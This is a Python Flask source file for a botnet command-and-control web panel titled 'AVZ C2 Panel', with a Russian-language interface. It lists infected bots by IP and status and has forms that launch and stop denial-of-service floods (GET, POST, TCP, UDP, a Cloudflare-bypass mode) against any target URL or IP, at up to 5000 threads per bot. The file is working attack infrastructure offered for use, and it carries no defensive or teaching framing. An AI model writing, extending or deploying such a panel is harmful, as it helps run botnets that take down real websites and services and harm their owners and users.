import threading, json, os
from flask import Flask, render_template_string, request, redirect

BOTS_FILE = "bots.json"

HTML_TEMPLATE = '''
<!doctype html>
<html>
<head><title>AVZ C2 Panel</title>
<style>
body{background:#1e1e1e;color:#ccc;font-family:sans-serif;padding:20px}
input,select,button{padding:8px;margin:4px;background:#333;border:1px solid #555;color:#fff}
table{border-collapse:collapse;width:100%}
th,td{border:1px solid #555;padding:8px;text-align:left}
th{background:#333}
.active{color:#0f0}
.inactive{color:#f00}
</style>
</head>
<body>
<h1>AVZ C2 Panel</h1>
<p>Управление ботами</p>
<h2>Запустить атаку</h2>
<form method="post" action="/attack">
Цель: <input name="target" placeholder="URL/IP" required>
Метод: <select name="method">
<option>GET</option><option>POST</option><option>CFBUAM</option><option>BOT</option><option>TCP</option><option>UDP</option>
</select>
Потоки: <input name="threads" type="number" value="100" min="10" max="5000">
Боты: <select name="bots">
<option value="all">Все</option>
{% for bot in bots %}
<option value="{{ bot.ip }}">{{ bot.ip }} ({{ bot.status }})</option>
{% endfor %}
</select>
<button type="submit">Запустить</button>
</form>
<h2>Остановить атаку</h2>
<form method="post" action="/stop">
Боты: <select name="bots">
<option value="all">Все</option>
{% for bot in bots %}
<option value="{{ bot.ip }}">{{ bot.ip }}</option>
{% endfor %}
</select>
<button type="submit">Стоп</button>
</form>
<h2>Боты ({{ bots|length }})</h2>
<table>
<tr><th>IP</th><th>Статус</th><th>Последняя активность</th></tr>
{% for bot in bots %}
<tr>
<td>{{ bot.ip }}</td>
<td class="{{ 'active' if bot.status == 'online' else 'inactive' }}">{{ bot.status }}</td>
<td>{{ bot.last_seen }}</td>
</tr>
{% endfor %}
</table>
</body>
</html>
'''

class WebPanel:
    def __init__(self, c2_server, log_func=None, port=8080):
        self.c2 = c2_server
        self.log = log_func or print
        self.port = port
        self.app = Flask(__name__)
        self.running = False
        self._setup_routes()

    def _setup_routes(self):
        @self.app.route('/')
        def index():
            bots = self.c2.get_bots()
            bot_list = []
            for ip, info in bots.items():
                bot_list.append({
                    'ip': ip,
                    'status': info.get('status', 'offline'),
                    'last_seen': info.get('last_seen', '')
                })
            return render_template_string(HTML_TEMPLATE, bots=bot_list)

        @self.app.route('/attack', methods=['POST'])
        def attack():
            target = request.form.get('target', '')
            method = request.form.get('method', 'GET')
            threads = request.form.get('threads', '100')
            bots = request.form.get('bots', 'all')
            if bots == 'all':
                self.c2.launch_attack(target, method, threads, 'all')
                self.log(f"[Web] Атака {target} запущена на всех ботах\n")
            else:
                self.c2.launch_attack(target, method, threads, [bots])
                self.log(f"[Web] Атака {target} запущена на {bots}\n")
            return redirect('/')

        @self.app.route('/stop', methods=['POST'])
        def stop():
            bots = request.form.get('bots', 'all')
            if bots == 'all':
                self.c2.stop_attack('all')
                self.log("[Web] Атака остановлена на всех ботах\n")
            else:
                self.c2.stop_attack([bots])
                self.log(f"[Web] Атака остановлена на {bots}\n")
            return redirect('/')

    def start(self):
        self.running = True
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        self.app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)

    def stop(self):
        self.running = False
